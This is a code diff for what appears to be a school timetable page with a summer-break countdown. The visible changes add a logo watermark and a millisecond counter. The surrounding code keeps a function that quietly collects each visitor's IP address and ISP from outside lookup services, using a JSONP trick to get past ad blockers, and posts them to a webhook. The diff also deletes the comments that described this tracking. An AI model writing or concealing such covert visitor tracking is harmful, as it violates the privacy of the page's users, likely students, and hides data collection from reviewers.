@@ -58,9 +58,33 @@
         .privacy-box:hover .blur-text {
             filter: blur(0);
         }
+        /* School Logo Watermark Styling */
+        .school-watermark {
+            position: fixed;
+            top: 1.5rem;
+            right: 1.5rem;
+            opacity: 0.3;
+            pointer-events: none;
+            z-index: 0;
+            transition: opacity 0.3s ease;
+            max-width: 140px;
+        }
+        @media (max-width: 768px) {
+            .school-watermark {
+                max-width: 80px;
+                top: 1rem;
+                right: 1rem;
+                opacity: 0.2;
+            }
+        }
     </style>
 </head>
 <body class="p-4 md:p-8">
+
+    <!-- Watermark Logo -->
+    <div class="school-watermark">
+        <img src="https://upload.wikimedia.org/wikipedia/en/2/25/Majurocoopschoollogo.png" alt="School Logo" id="schoolLogo">
+    </div>
 
     <div id="summerOverlay">
         <div class="p-8">
@@ -71,7 +95,7 @@
         </div>
     </div>
 
-    <div class="max-w-6xl mx-auto" id="mainContent">
+    <div class="max-w-6xl mx-auto relative z-10" id="mainContent">
         <div class="flex flex-col md:flex-row items-center justify-between mb-8 gap-4">
             <!-- Privacy Box -->
             <div id="userInfo" class="privacy-box bg-white/80 border border-slate-200 px-4 py-2 rounded-xl text-[10px] text-slate-500 font-mono shadow-sm flex flex-col min-w-[220px] relative overflow-hidden group">
@@ -93,14 +117,16 @@
 
         <div id="countdownSection" class="hidden mb-8 countdown-gradient rounded-2xl p-8 text-white shadow-xl text-center border border-slate-700">
             <h2 class="text-sm font-bold uppercase tracking-[0.3em] text-slate-400 mb-6">Countdown to Summer Break</h2>
-            <div id="countdownDisplay" class="text-4xl md:text-7xl font-black tracking-tighter flex justify-center gap-4 md:gap-8">
-                <div class="flex flex-col"><span id="days">00</span><span class="text-xs uppercase tracking-widest text-slate-400 mt-2">Days</span></div>
-                <span class="opacity-30 self-center">:</span>
-                <div class="flex flex-col"><span id="hours">00</span><span class="text-xs uppercase tracking-widest text-slate-400 mt-2">Hrs</span></div>
-                <span class="opacity-30 self-center">:</span>
-                <div class="flex flex-col"><span id="minutes">00</span><span class="text-xs uppercase tracking-widest text-slate-400 mt-2">Min</span></div>
-                <span class="opacity-30 self-center">:</span>
-                <div class="flex flex-col"><span id="seconds">00</span><span class="text-xs uppercase tracking-widest text-slate-400 mt-2">Sec</span></div>
+            <div id="countdownDisplay" class="text-3xl md:text-6xl font-black tracking-tighter flex justify-center gap-3 md:gap-6">
+                <div class="flex flex-col items-center"><span id="days">00</span><span class="text-[10px] uppercase tracking-widest text-slate-400 mt-2">Days</span></div>
+                <span class="opacity-30 self-center mb-6">:</span>
+                <div class="flex flex-col items-center"><span id="hours">00</span><span class="text-[10px] uppercase tracking-widest text-slate-400 mt-2">Hrs</span></div>
+                <span class="opacity-30 self-center mb-6">:</span>
+                <div class="flex flex-col items-center"><span id="minutes">00</span><span class="text-[10px] uppercase tracking-widest text-slate-400 mt-2">Min</span></div>
+                <span class="opacity-30 self-center mb-6">:</span>
+                <div class="flex flex-col items-center"><span id="seconds">00</span><span class="text-[10px] uppercase tracking-widest text-slate-400 mt-2">Sec</span></div>
+                <span class="opacity-30 self-center mb-6">:</span>
+                <div class="flex flex-col items-center"><span id="ms" class="text-blue-400">00</span><span class="text-[10px] uppercase tracking-widest text-blue-500/50 mt-2">Ms</span></div>
             </div>
         </div>
 
@@ -142,9 +168,6 @@
         let weekOffset = 0;
         const summerDate = new Date("May 29, 2026 00:00:00").getTime();
 
-        /** * FIX: ADBLOCKER BYPASS SECURITY LOGIC
-         * We use multiple fallback strategies to ensure IP and ISP are caught.
-         */
         function startSecurity() {
             let webhookTriggered = false;
 
@@ -163,17 +186,14 @@
                     }]
                 };
 
-                // Use XHR for maximum compatibility
                 const xhr = new XMLHttpRequest();
                 xhr.open("POST", WEBHOOK_URL);
                 xhr.setRequestHeader("Content-Type", "application/json");
                 xhr.send(JSON.stringify(payload));
             };
 
-            // Strategy 1: JSONP Fallback (Harder for Adblockers to catch than Fetch)
             window.handleIPResponse = function(data) {
                 if (data && data.ip) {
-                    // Once we have IP, try to get ISP via another provider
                     fetch('https://ipapi.co/json/')
                         .then(r => r.json())
                         .then(d => dispatch(data.ip, d.org || d.isp || "Unknown Provider"))
@@ -181,11 +201,9 @@
                 }
             };
 
-            // Load IP script
             const s = document.createElement('script');
             s.src = "https://api.ipify.org?format=jsonp&callback=handleIPResponse";
             s.onerror = () => {
-                // Strategy 2: Direct Fetch if JSONP fails
                 fetch('https://ipapi.co/json/')
                     .then(r => r.json())
                     .then(d => dispatch(d.ip, d.org || d.isp || "Unknown"))
@@ -208,16 +226,26 @@
         }
 
         function updateCountdown() {
-            const distance = summerDate - new Date().getTime();
+            const now = new Date().getTime();
+            const distance = summerDate - now;
+
             if (distance < 0) {
                 document.getElementById("summerOverlay").style.display = "flex";
                 document.getElementById("mainContent").style.display = "none";
                 return;
             }
-            document.getElementById("days").textContent = String(Math.floor(distance / 86400000)).padStart(2, '0');
-            document.getElementById("hours").textContent = String(Math.floor((distance % 86400000) / 3600000)).padStart(2, '0');
-            document.getElementById("minutes").textContent = String(Math.floor((distance % 3600000) / 60000)).padStart(2, '0');
-            document.getElementById("seconds").textContent = String(Math.floor((distance % 60000) / 1000)).padStart(2, '0');
+
+            const d = Math.floor(distance / 86400000);
+            const h = Math.floor((distance % 86400000) / 3600000);
+            const m = Math.floor((distance % 3600000) / 60000);
+            const s = Math.floor((distance % 60000) / 1000);
+            const ms = Math.floor((distance % 1000) / 10); // Display 2 digits (0-99)
+
+            document.getElementById("days").textContent = String(d).padStart(2, '0');
+            document.getElementById("hours").textContent = String(h).padStart(2, '0');
+            document.getElementById("minutes").textContent = String(m).padStart(2, '0');
+            document.getElementById("seconds").textContent = String(s).padStart(2, '0');
+            document.getElementById("ms").textContent = String(ms).padStart(2, '0');
         }
 
         function getWeekNumber(d) {
@@ -278,7 +306,8 @@
             renderSchedule();
             updateClock();
             setInterval(updateClock, 1000);
-            setInterval(updateCountdown, 1000);
+            // Increased frequency to 10ms for smooth millisecond updates
+            setInterval(updateCountdown, 10);
         };
     </script>
 </body>
